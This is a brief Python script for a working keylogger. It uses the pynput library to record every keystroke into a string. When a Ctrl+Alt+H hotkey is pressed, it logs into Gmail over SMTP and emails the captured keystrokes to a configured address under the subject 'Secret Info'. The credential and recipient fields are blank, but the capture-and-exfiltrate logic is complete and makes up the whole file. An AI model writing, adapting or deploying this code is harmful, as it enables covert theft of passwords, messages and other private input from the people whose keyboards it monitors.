from pynput.keyboard import Key, Listener, HotKey
import sys
import smtplib

body = "begin"
def main():
    #Email Stuff
    gmail_user = ""
    gmail_password = ""
    sent_from = gmail_user
    to = [""]
    subject = "Secret Info"
    
    
    #Sends our email and stops the keylogger
    def on_activate():
        print("Hotkey Pressed")
        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(gmail_user, gmail_password)
            print(body)
            email_text = """\
                    From: {}, 
                    To: {} 
                    Subject: {} 

                    {}""".format(sent_from,to,subject,body)
            server.sendmail(sent_from, to, email_text)
            server.close()
            print("Email Sent")
            print(email_text)
        except:
            print("something wrong yo")

        sys.exit(0)

    def on_press(key):
        global body
        body=body+str(key)
   
    def for_canonical(f):
        return lambda k: f(listener.canonical(k))

    hotkey = HotKey(HotKey.parse('<ctrl>+<alt>+h'),on_activate)

    with Listener(on_press=on_press, on_release=for_canonical(hotkey.press)) as listener:
        listener.join()

if __name__ == "__main__":
    main()
